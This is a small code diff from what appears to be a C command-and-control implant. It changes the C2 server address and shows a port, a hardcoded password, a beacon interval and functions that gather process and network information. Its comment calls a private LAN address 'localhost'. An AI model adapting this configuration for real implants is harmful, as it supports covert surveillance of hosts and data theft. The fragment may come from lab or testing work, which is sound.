@@ -21,7 +21,7 @@ char* get_process_list();
 char* get_network_info();
 
 // Configuration
-#define C2_SERVER "192.168.1.211"  // Localhost for testing
+#define C2_SERVER "192.168.253.25"  // Localhost for testing
 #define C2_PORT 8080
 #define PASSWORD "Mr.Robot"
 #define BEACON_INTERVAL 30000
